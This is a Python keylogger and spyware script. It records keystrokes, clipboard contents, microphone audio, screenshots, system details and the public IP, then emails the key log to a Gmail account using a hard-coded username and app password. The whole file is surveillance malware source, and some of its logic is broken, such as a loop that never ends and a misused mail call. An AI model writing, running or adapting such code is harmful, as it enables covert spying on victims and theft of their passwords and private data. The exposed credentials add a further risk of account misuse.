# Libraries

# email
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# system info.
import socket
import platform

# clipboard
import win32clipboard

# pyinput
from pynput.keyboard import Key, Listener

# for tracking time and os module
import time
import os

# microphone
from scipy.io.wavfile import write
import sounddevice as sd

# cryptography
from cryptography.fernet import Fernet

# user information
import getpass
from requests import get

# screenshot
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# cholo
keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

file_path = "D:\\Python Projets\\KeyLog\\Project"
extend = "\\"


def gmail_login(username, password):
    smtp_server_name = "smtp.gmail.com"
    port_number = 587
    server = smtplib.SMTP(host=smtp_server_name, port=port_number)
    server.connect(host=smtp_server_name, port=port_number)
    server.starttls()
    server.login(user=username, password=password)
    return server


msg = MIMEMultipart()
msg['Subject'] = "Test Mail"
msg['From'] = 'ecomapp55@gmail.com'
msg['To'] = 'ecomapp66@gmail.com'
msg['Bcc'] = ''

body = "KAL KeyLog"
msg.attach(MIMEText(body, 'plain'))
file_path1 = r"D:\Python Projets\KeyLog\Project"
file_name = "key_log.txt"

file = open(file_path1 + "\\" + file_name, "rb")

payload = MIMEBase('application', 'octet-stream')
payload.set_payload(file.read())
file.close()
encoders.encode_base64(payload)
payload.add_header('Content-Disposition', 'attachment', filename=file_name)
msg.attach(payload)

server = gmail_login(username='ecomapp55@gmail.com', password='xtmdqynwqxipntim')
server.send_message(msg)
server.quit()
print("email sent")


# sys_info

def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address : " + public_ip + '\n')

        except Exception:
            f.write("Couldn't get IP address." '\n')

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.python_version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("IP Address: " + IPAddr + "\n \n")


computer_information()


# clipboard

def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data :  \n " + pasted_data)

        except:
            f.write(" Clipboard couldn't be copied ")


copy_clipboard()


# mic

def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)


microphone()


# ss
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)


screenshot()

# timer
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:
    count = 0
    keys = []


def on_press(key):
    global keys, count, currentTime

    print(key)
    keys.append(key)
    count += 1
    currentTime = time.time()

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()


def on_release(key):
    if key == Key.esc:  # exit from keylogger
        return False

    if currentTime > stoppingTime:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

    if currentTime > stoppingTime:
        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")
            screenshot()
            server.send_message(screenshot_information, file_path + extend + screenshot_information,to_addrs='ecomapp66@gmail.com')

            copy_clipboard()
            number_of_iterations += 1
            currentTime = time.time() + time_iteration















